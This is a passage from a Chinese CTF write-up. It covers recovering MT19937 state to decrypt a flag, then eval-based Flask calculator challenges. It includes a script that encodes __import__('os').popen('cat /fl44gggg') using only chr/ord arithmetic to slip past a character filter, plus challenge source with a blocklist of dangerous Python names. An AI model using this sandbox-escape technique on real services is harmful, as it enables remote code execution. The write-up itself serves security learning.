</span></span><span style=display:flex><span>    y <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> (y <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>18</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Reverse left shift 15 and mask</span>
</span></span><span style=display:flex><span>    temp <span style=color:#f92672>=</span> y
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>):
</span></span><span style=display:flex><span>        temp <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> ((temp <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>15</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xEFC60000</span>)
</span></span><span style=display:flex><span>    y <span style=color:#f92672>=</span> temp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Reverse left shift 7 and mask</span>
</span></span><span style=display:flex><span>    temp <span style=color:#f92672>=</span> y
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>        temp <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> ((temp <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x9D2C5680</span>)
</span></span><span style=display:flex><span>    y <span style=color:#f92672>=</span> temp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Reverse right shift 11</span>
</span></span><span style=display:flex><span>    temp <span style=color:#f92672>=</span> y
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>3</span>):
</span></span><span style=display:flex><span>        temp <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> (temp <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>11</span>)
</span></span><span style=display:flex><span>    y <span style=color:#f92672>=</span> temp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> y <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>predict_next</span>(outputs, num_predict):
</span></span><span style=display:flex><span>    state <span style=color:#f92672>=</span> [untemper(x) <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> outputs]
</span></span><span style=display:flex><span>    mt <span style=color:#f92672>=</span> MT19937(state)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    predicted <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(num_predict):
</span></span><span style=display:flex><span>        predicted<span style=color:#f92672>.</span>append(mt<span style=color:#f92672>.</span>extract_number())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> predicted
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># Read data.txt</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;data.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        lines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
</span></span><span style=display:flex><span>        K1_outputs <span style=color:#f92672>=</span> ast<span style=color:#f92672>.</span>literal_eval(lines[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>        K2_outputs <span style=color:#f92672>=</span> ast<span style=color:#f92672>.</span>literal_eval(lines[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>        c1 <span style=color:#f92672>=</span> ast<span style=color:#f92672>.</span>literal_eval(lines[<span style=color:#ae81ff>2</span>]<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>        c2 <span style=color:#f92672>=</span> ast<span style=color:#f92672>.</span>literal_eval(lines[<span style=color:#ae81ff>3</span>]<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Length of K1_outputs:&#34;</span>, len(K1_outputs))
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Length of K2_outputs:&#34;</span>, len(K2_outputs))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Calculate cal values</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 对于K1，我们使用全部624个状态</span>
</span></span><span style=display:flex><span>    cal1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    next_nums1 <span style=color:#f92672>=</span> predict_next(K1_outputs, <span style=color:#ae81ff>624</span>)
</span></span><span style=display:flex><span>    cal1 <span style=color:#f92672>=</span> sum(next_nums1)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;cal1 calculated:&#34;</span>, cal1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 对于K2，我们只使用前600个状态，但仍需预测156个数</span>
</span></span><span style=display:flex><span>    cal2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    next_nums2 <span style=color:#f92672>=</span> predict_next(K2_outputs, <span style=color:#ae81ff>156</span>)  <span style=color:#75715e># 624//4 = 156</span>
</span></span><span style=display:flex><span>    cal2 <span style=color:#f92672>=</span> sum(next_nums2)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;cal2 calculated:&#34;</span>, cal2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(cal, ciphertext):
</span></span><span style=display:flex><span>        key <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>sha256(str(cal)<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>digest()
</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_ECB)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> unpad(cipher<span style=color:#f92672>.</span>decrypt(ciphertext), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Attempting decryption...&#34;</span>)
</span></span><span style=display:flex><span>        m1 <span style=color:#f92672>=</span> decrypt(cal1, bytes(c1))
</span></span><span style=display:flex><span>        m2 <span style=color:#f92672>=</span> decrypt(cal2, bytes(c2))
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>=</span> m1 <span style=color:#f92672>+</span> m2
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flag
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Decryption error: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;cal1: </span><span style=color:#e6db74>{</span>cal1<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;cal2: </span><span style=color:#e6db74>{</span>cal2<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Starting solver...&#34;</span>)
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> solve()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> flag:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Flag:&#34;</span>, flag<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Flag (raw):&#34;</span>, flag)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Failed to recover flag&#34;</span>)
</span></span></code></pre></div><h2 id=web复现>web(复现)</h2><h3 id=0进制计算器>0进制计算器</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template, request, jsonify
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home</span>():  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/execute&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>execute_code</span>():  
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>json  
</span></span><span style=display:flex><span>    code <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;code&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)  
</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> executer(code)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> output   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> contextlib <span style=color:#f92672>import</span> redirect_stdout
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> io <span style=color:#f92672>import</span> StringIO
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>StupidInterpreter</span>:  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):  
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>variables <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>interpret</span>(self, code):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>checker(code) <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;有脏东西！&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        commands <span style=color:#f92672>=</span> code<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;;&#39;</span>)  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> command <span style=color:#f92672>in</span> commands:
</span></span><span style=display:flex><span>            command <span style=color:#f92672>=</span> command<span style=color:#f92672>.</span>strip()  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> command:  
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>execute_command(command)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>execute_command</span>(self, command):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>in</span> command:  
</span></span><span style=display:flex><span>            variable, expression <span style=color:#f92672>=</span> command<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#ae81ff>1</span>)  
</span></span><span style=display:flex><span>            variable <span style=color:#f92672>=</span> variable<span style=color:#f92672>.</span>strip()  
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>evaluate_expression(expression<span style=color:#f92672>.</span>strip())  
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>variables[variable] <span style=color:#f92672>=</span> result  
</span></span><span style=display:flex><span>        <span style=color:#75715e>#执行打印操作</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> command<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;cdhor(&#39;</span>) <span style=color:#f92672>and</span> command<span style=color:#f92672>.</span>endswith(<span style=color:#e6db74>&#39;)&#39;</span>):
</span></span><span style=display:flex><span>            expression <span style=color:#f92672>=</span> command[<span style=color:#ae81ff>6</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()  
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>evaluate_expression(expression)  
</span></span><span style=display:flex><span>            print(result)  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:  
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;未知指令: </span><span style=color:#e6db74>{</span>command<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>evaluate_expression</span>(self, expression):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> var, value <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>variables<span style=color:#f92672>.</span>items():  
</span></span><span style=display:flex><span>            expression <span style=color:#f92672>=</span> expression<span style=color:#f92672>.</span>replace(var, str(value))  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> eval(expression, {}, {})
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:  
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;执行出错: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>  
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>checker</span>(self, string):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            string<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;ascii&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>UnicodeEncodeError</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span> 
</span></span><span style=display:flex><span>        allow_chr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0cdhor+-*/=()&#34;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>; &#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> string:  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> char <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> allow_chr:  
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>executer</span>(code):
</span></span><span style=display:flex><span>    outputIO <span style=color:#f92672>=</span> StringIO()
</span></span><span style=display:flex><span>    interpreter <span style=color:#f92672>=</span> StupidInterpreter()  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> redirect_stdout(outputIO):
</span></span><span style=display:flex><span>        interpreter<span style=color:#f92672>.</span>interpret(code)
</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> outputIO<span style=color:#f92672>.</span>getvalue()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>(output)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:  
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>        allow_chr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0cdhor+-*/=()&#34;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>; &#39;</span>
</span></span></code></pre></div><p>这是运行通过的字符，<code>eval</code>可以执行的一是"=&ldquo;号右侧的部分，二是cdhor()内的部分</p><p>cdhor刚好可以组成chr和ord，可以利用这两个函数来组成任意字符。chr(ord())形式的代码可以在等号右侧被转换为需要执行的代码后，再经过cdhor()执行并输出结果</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_char</span>(char):
</span></span><span style=display:flex><span>    char_ascii_bin <span style=color:#f92672>=</span> str(bin(ord(char)))
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    index <span style=color:#f92672>=</span> len(char_ascii_bin) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> a <span style=color:#f92672>in</span> char_ascii_bin:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> index <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> a <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>:
</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#34;(ord(&#39;*&#39;)-ord(&#39;)&#39;))&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> index <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> a <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>:
</span></span><span style=display:flex><span>            mid_res <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;(ord(&#39;*&#39;)-ord(&#39;(&#39;))&#34;</span> <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(index)]
</span></span><span style=display:flex><span>            result<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#34;*&#34;</span><span style=color:#f92672>.</span>join(mid_res))
</span></span><span style=display:flex><span>        index <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>(<span style=color:#e6db74>&#34;+&#34;</span><span style=color:#f92672>.</span>join(result))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_sentence</span>(string):
</span></span><span style=display:flex><span>    char_expressions <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;chr(&#34;</span> <span style=color:#f92672>+</span> generate_char(char) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;)&#34;</span> <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> string]
</span></span><span style=display:flex><span>    sentence_expression <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span><span style=color:#f92672>.</span>join(char_expressions)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>(sentence_expression)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 定义字符串</span>
</span></span><span style=display:flex><span>sentence <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;__import__(&#39;os&#39;).popen(&#39;cat /fl44gggg&#39;).read()&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 生成表达式</span>
</span></span><span style=display:flex><span>generated_expression <span style=color:#f92672>=</span> generate_sentence(sentence)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 打印生成的表达式</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Generated Expression:&#34;</span>)
</span></span><span style=display:flex><span>print(generated_expression)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 执行并打印结果</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> eval(generated_expression)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Execution Result:&#34;</span>)
</span></span><span style=display:flex><span>print(result)
</span></span></code></pre></div><p><img alt=26 loading=lazy src=/posts/ctf/shctf2024/26.png></p><p>解密脚本的大致原理是设定了权值，将代码转化为ASCII再转化为二进制的形式，按照给定的权值进行转化，最后再拼接，本地可以测试测试。</p><h3 id=0进制计算器-pro-max>0进制计算器 pro max</h3><p>先上源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template, request, jsonify
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> contextlib <span style=color:#f92672>import</span> redirect_stdout
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> io <span style=color:#f92672>import</span> StringIO
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sys <span style=color:#f92672>import</span> addaudithook
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>audit_enabled <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>dangerous_operation_detected <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home</span>():  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/execute&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>execute_code</span>():  
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>json  
</span></span><span style=display:flex><span>    code <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;code&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)  
</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> executer(code)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> output   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dangerous_operations <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;marshal&#34;</span>, <span style=color:#e6db74>&#34;__new__&#34;</span>, <span style=color:#e6db74>&#34;process&#34;</span>, <span style=color:#e6db74>&#34;os&#34;</span>, <span style=color:#e6db74>&#34;sys&#34;</span>, <span style=color:#e6db74>&#34;interpreter&#34;</span>, <span style=color:#e6db74>&#34;open&#34;</span>, 
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;cpython&#34;</span>, <span style=color:#e6db74>&#34;compile&#34;</span>, <span style=color:#e6db74>&#34;gc&#34;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>dangerous_strings <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;__&#34;</span>, <span style=color:#e6db74>&#34;getattr&#34;</span>, <span style=color:#e6db74>&#34;exit&#34;</span>]
</span></span><span style=display:flex><span>dangerous_opcodes <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;LOAD_GLOBAL&#34;</span>, <span style=color:#e6db74>&#34;IMPORT_NAME&#34;</span>, <span style=color:#e6db74>&#34;LOAD_METHOD&#34;</span>]
</span></span><span style=display:flex><span>allowed_functions <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;print&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CleverInterpreter</span>:  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):  
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>variables <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>interpret</span>(self, code):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>checker(code) <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;有脏东西！&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>        commands <span style=color:#f92672>=</span> code<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;;&#39;</span>)  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> command <span style=color:#f92672>in</span> commands:  
</span></span><span style=display:flex><span>            command <span style=color:#f92672>=</span> command<span style=color:#f92672>.</span>strip()  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> command:  
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>execute_command(command)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>execute_command</span>(self, command):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>in</span> command:  
</span></span><span style=display:flex><span>            variable, expression <span style=color:#f92672>=</span> command<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#ae81ff>1</span>)  
</span></span><span style=display:flex><span>            variable <span style=color:#f92672>=</span> variable<span style=color:#f92672>.</span>strip()  
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>evaluate_expression(expression<span style=color:#f92672>.</span>strip())  
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>variables[variable] <span style=color:#f92672>=</span> result  
</span></span><span style=display:flex><span>        <span style=color:#75715e># 执行打印操作</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> command<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;cdhor(&#39;</span>) <span style=color:#f92672>and</span> command<span style=color:#f92672>.</span>endswith(<span style=color:#e6db74>&#39;)&#39;</span>):
</span></span><span style=display:flex><span>            expression <span style=color:#f92672>=</span> command[<span style=color:#ae81ff>6</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()  
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>safe_executer(<span style=color:#e6db74>&#39;print(&#39;</span> <span style=color:#f92672>+</span> expression <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;)&#39;</span>)  
</span></span><span style=display:flex><span>            print(result)  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:  
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;未知指令: </span><span style=color:#e6db74>{</span>command<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>(<span style=color:#e6db74>&#34;&#34;</span>)
